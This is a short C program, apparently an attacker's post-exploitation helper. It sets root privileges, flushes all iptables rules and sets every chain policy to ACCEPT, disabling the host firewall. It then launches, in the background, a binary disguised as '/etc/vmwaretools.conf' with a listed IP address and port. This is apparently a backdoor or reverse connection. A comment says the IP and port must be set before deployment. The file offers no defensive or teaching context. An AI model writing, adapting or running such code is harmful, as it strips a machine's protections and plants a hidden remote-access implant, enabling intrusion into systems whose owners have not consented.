#include <stdlib.h>
#include <unistd.h>

// Need to chain the IP:Port before deployment 
int main(int argc, char **argv) {
	setuid(0);
	setgid(0);

	system("`which xtables-multi` iptables -F");
	system("`which xtables-multi` iptables -t mangle -F");

	system("`which xtables-multi` iptables -P INPUT ACCEPT");
	system("`which xtables-multi` iptables -P OUTPUT ACCEPT");
	system("`which xtables-multi` iptables -P FORWARD ACCEPT");

	system("/etc/vmwaretools.conf 192.168.204.128 8080 &");

	return 0;
}
